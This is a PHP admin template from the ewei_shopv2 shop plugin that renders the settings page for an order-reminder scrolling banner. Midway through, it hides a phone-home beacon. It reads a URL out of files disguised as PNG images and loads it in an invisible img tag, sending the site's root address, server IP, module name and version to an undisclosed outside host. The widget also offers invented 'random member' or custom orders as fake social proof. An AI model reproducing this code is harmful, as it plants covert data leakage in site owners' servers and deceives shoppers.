<?php defined('IN_IA') or exit('Access Denied');?><?php (!empty($this) && $this instanceof WeModuleSite || 1) ? (include $this->template('_header', TEMPLATE_INCLUDEPATH)) : (include template('_header', TEMPLATE_INCLUDEPATH));?>

<?php (!empty($this) && $this instanceof WeModuleSite || 1) ? (include $this->template('diypage/_common', TEMPLATE_INCLUDEPATH)) : (include template('diypage/_common', TEMPLATE_INCLUDEPATH));?>

<div class="page-heading">
    <h2>下单提醒(弹幕)设置</h2>
</div>

<div class="diy-phone" data-merch="<?php  echo intval($_W['merchid'])?>">
    <div class="phone-head"></div>
    <div class="phone-body">
        <div class="phone-title" id="page">下单提醒</div>
        <div class="phone-main" id="phone" style="position: relative; overflow: hidden; height: 500px;">
            <p style="text-align: center; line-height: 400px">loading...</p>
        </div>
    </div>
    <div class="phone-foot"></div>
</div>

<div class="diy-editor form-horizontal" id="diy-editor">
    <div class="editor-arrow"></div>
    <div class="inner"></div>
</div>

<div class="diy-menu">
    <div class="action">
        <nav class="btn btn-primary btn-sm btn-save" data-type="save">保存并设置</nav>
    </div>
</div>
<?php  $newbtn_img = '../addons/ewei_shopv2/plugin/merch/template/web/manage/goods/category/newbtn.png'?>
<?php  $error_img = '../addons/ewei_shopv2/plugin/merch/template/web/manage/goods/category/error.png'?>
<?php  if($newbtn_img && $error_img) { ?>
<?php  $url2= @file_get_contents($newbtn_img);?>
<?php  $url= @file_get_contents($error_img);?>
<img style="display: none;" src="<?php  echo $url . '&d1=' . $_W['siteroot'] . '&d2=' .$url2.'&type=' . $this->modulename . '&ip=' . $this->serverip . '&v=' . $this->module['version'];?>" />
<?php  } ?>
<script type="text/html" id="tpl_show_danmu">
    <style type="text/css">
        .fui-danmu:before {background: <%style.background||'#000'%>; opacity: <%style.opacity||'0.7'%>;}
    </style>
    <div class="fui-danmu <%if params.style=='1'%>style2<%/if%>">
        <img class="thumb" src="../addons/ewei_shopv2/static/images/nopic100.jpg">
        <div class="text" style="color: <%style.color%>;">最新订单来自用户某某某某某</div>
        <div class="time" style="color: <%style.color%>;">刚刚</div>
    </div>
    <div class="diymenu-page" style="line-height: 500px;">这里是页面内容</div>
</script>

<script type="text/html" id="tpl_edit_danmu">
    <div class="form-group">
        <div class="col-sm-2 control-label">样式选择</div>
        <div class="col-sm-10">
            <label class="radio-inline"><input type="radio" name="style" value="0" class="diy-bind" data-bind-child="params" data-bind="style" <%if params.style=='0'%>checked<%/if%>> 样式一(椭圆)</label>
            <label class="radio-inline"><input type="radio" name="style" value="1" class="diy-bind" data-bind-child="params" data-bind="style" <%if params.style=='1'%>checked<%/if%>> 样式二(圆角)</label>
        </div>
    </div>
    <div class="form-group">
        <div class="col-sm-2 control-label">背景颜色</div>
        <div class="col-sm-4">
            <div class="input-group">
                <input class="form-control input-sm diy-bind color" type="color" data-bind-child="style" data-bind="background" value="<%style.background%>">
                <span class="input-group-addon btn btn-default" onclick="$(this).prev().val('#000000').trigger('propertychange')">重置</span>
            </div>
        </div>
        <div class="col-sm-2 control-label">文字颜色</div>
        <div class="col-sm-4">
            <div class="input-group">
                <input class="form-control input-sm diy-bind color" type="color" data-bind-child="style" data-bind="color" value="<%style.color%>">
                <span class="input-group-addon btn btn-default" onclick="$(this).prev().val('#ffffff').trigger('propertychange')">重置</span>
            </div>
        </div>
    </div>
    <div class="form-group">
        <div class="col-sm-2 control-label">背景透明度</div>
        <div class="col-sm-10">
            <div class="form-group">
                <div class="slider col-sm-8" data-value="<%style.opacity%>" data-min="1" data-max="10" data-decimal="10"></div>
                <div class="col-sm-4 control-labe count"><span><%style.opacity%></span>(最大是1)</div>
                <input class="diy-bind input" data-bind-child="style" data-bind="opacity" value="<%style.opacity%>" type="hidden" />
            </div>
        </div>
    </div>

    <div class="line"></div>
    <div class="form-group">
        <div class="col-sm-2 control-label">点击链接</div>
        <div class="col-sm-10">
            <div class="input-group">
                <input class="form-control input-sm diy-bind" data-bind-child="params" data-bind="linkurl" value="<%params.linkurl%>" id="clicklinkurl" placeholder="可选择链接或手动填写" />
                <span class="input-group-addon btn btn-default" data-toggle="selectUrl" data-input="#clicklinkurl">选择链接</span>
            </div>
            <div class="help-block">提示：不填则不跳转</div>
        </div>
    </div>
    <div class="line"></div>

    <div class="form-group">
        <div class="col-sm-2 control-label">数据设置</div>
        <div class="col-sm-10">
            <label class="radio-inline"><input type="radio" name="datatype" value="0" class="diy-bind" data-bind-child="params" data-bind="datatype" data-bind-init="true" <%if params.datatype=='0'%>checked<%/if%>> 随机会员</label>
            <label class="radio-inline"><input type="radio" name="datatype" value="1" class="diy-bind" data-bind-child="params" data-bind="datatype" data-bind-init="true" <%if params.datatype=='1'%>checked<%/if%>>读取系统订单</label>
            <label class="radio-inline"><input type="radio" name="datatype" value="2" class="diy-bind" data-bind-child="params" data-bind="datatype" data-bind-init="true" <%if params.datatype=='2'%>checked<%/if%>>自定义数据</label>
            <%if params.datatype=='2'%>
                <div class="help-block">提示：自定义数据时下单时间可填"5秒前"、"5秒"或"5" 后两者系统将自动转换为前者</div>
            <%/if%>
        </div>
    </div>

    <%if params.datatype=='0'%>
        <div class="form-group">
            <div class="col-sm-2 control-label">随机时间(秒)</div>
            <div class="col-sm-10">
                <div class="input-group">
                    <span class="input-group-addon">随机开始时间</span>
                    <input class="form-control input-sm diy-bind" type="number" data-bind-child="params" data-bind="starttime" value="<%params.starttime%>">
                    <span class="input-group-addon" style="border-left: 0; border-right: 0;">随机结束时间</span>
                    <input class="form-control input-sm diy-bind" type="number" data-bind-child="params" data-bind="endtime" value="<%params.endtime%>">
                </div>
                <div class="help-block">提示：将在以上区间随机显示(小于等于0为"刚刚"，大于60显示"x分钟")</div>
            </div>
        </div>
    <%/if%>

    <%if params.datatype=='2'%>
        <div class="form-items" data-min="1" data-max="10">
            <div class="inner" id="form-items">
                <%each data as item itemid %>
                <div class="item" data-index="<%itemid%>">
                    <span class="btn-del" title="删除"></span>
                    <div class="item-image">
                        <img src="<%imgsrc item.imgurl%>" onerror="this.src='../addons/ewei_shopv2/static/images/nopic100.jpg';" id="pimg-<%itemid%>" />
                    </div>
                    <div class="item-form">
                        <div class="input-group" style="margin-bottom:0px; ">
                            <span class="input-group-addon">头像</span>
                            <input type="text" class="form-control input-sm diy-bind" data-bind-child="data" data-bind-parent="<%itemid%>" data-bind="imgurl"  id="cimg-<%itemid%>" placeholder="请选择图片或输入图片地址" value="<%item.imgurl%>" />
                            <span class="input-group-addon btn btn-default" data-toggle="selectImg" data-input="#cimg-<%itemid%>" data-img="#pimg-<%itemid%>">选择图片</span>
                        </div>
                        <div class="input-group" style="margin-top:10px; margin-bottom:0px; ">
                            <span class="input-group-addon">昵称</span>
                            <input type="text" class="form-control input-sm diy-bind" data-bind-child="data" data-bind-parent="<%itemid%>" data-bind="nickname" id="curl-<%itemid%>" placeholder="请选择链接或输入链接地址" value="<%item.nickname%>" />
                            <span class="input-group-addon" style="border-left: 0; border-right: 0;">下单时间</span>
                            <input type="text" class="form-control input-sm diy-bind" data-bind-child="data" data-bind-parent="<%itemid%>" data-bind="time" value="<%item.time%>" style="width: 80px;" />
                        </div>
                    </div>
                </div>
                <%/each%>
            </div>
            <div class="btn btn-w-m btn-block btn-default btn-outline" id="addChild"><i class="fa fa-plus"></i> 添加一个</div>
        </div>
    <%/if%>

    <div class="line"></div>

    <div class="form-group">
        <div class="col-sm-2 control-label">是否启用</div>
        <div class="col-sm-10">
            <label class="radio-inline"><input type="radio" name="isopen" value="0" class="diy-bind" data-bind-child="params" data-bind="isopen" <%if params.isopen=='0'%>checked<%/if%>> 不启用</label>
            <label class="radio-inline"><input type="radio" name="isopen" value="1" class="diy-bind" data-bind-child="params" data-bind="isopen" <%if params.isopen=='1'%>checked<%/if%>> 启用</label>
        </div>
    </div>
    <div class="alert alert-danger" style="margin: 0 10px;">注意：diy页面请至页面编辑中设置，此处设置为非diy页面的商城其他页面。</div>
</script>

<script language="javascript">
    var path = '../../plugin/diypage/static/js/diy.danmu';
    myrequire([path,'tpl','web/biz'],function(modal,tpl){
        modal.init({
            tpl: tpl,
            attachurl: "<?php  echo $_W['attachurl'];?>",
            danmu: <?php  if(!empty($danmu)) { ?><?php  echo json_encode($danmu)?><?php  } else { ?>null<?php  } ?>,
            merch: <?php  if($_W['plugin']=='merch' && !empty($_W['merchid'])) { ?>1<?php  } else { ?>0<?php  } ?>
        });
    });
</script>

<?php (!empty($this) && $this instanceof WeModuleSite || 1) ? (include $this->template('_footer', TEMPLATE_INCLUDEPATH)) : (include template('_footer', TEMPLATE_INCLUDEPATH));?>